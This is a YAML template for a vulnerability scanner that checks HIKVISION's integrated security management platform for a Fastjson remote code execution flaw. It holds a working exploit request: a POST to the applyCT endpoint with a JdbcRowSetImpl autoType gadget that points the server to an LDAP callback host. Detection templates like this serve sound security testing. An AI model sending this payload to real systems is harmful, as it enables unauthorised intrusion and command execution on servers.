expression: r0()
id: hikvision-applyct-fastjson-rce
info:
  author: zan8in
  description: "HIKVISION \u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\u53F0 applyCT\
    \ \u5B58\u5728\u4F4E\u7248\u672CFastjson\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\
    \u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u6267\u884C\
    \u4EFB\u610F\u547D\u4EE4\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\napp=\"HIKVISION-\u7EFC\
    \u5408\u5B89\u9632\u7BA1\u7406\u5E73\u53F0\"\n"
  name: "HIKVISION \u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\u53F0 applyCT Fastjson\u8FDC\
    \u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/HIKVISION/HIKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20applyCT%20Fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
  severity: critical
rules:
  r0:
    expression: reverse.wait(5)
    request:
      body: "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"\
        },\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"\
        ldap://{{reverseURL}}\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"} \n"
      headers:
        Content-Type: application/json
      method: POST
      path: /bic/ssoService/v1/applyCT
set:
  reverse: newReverse()
  reverseURL: reverse.url.host
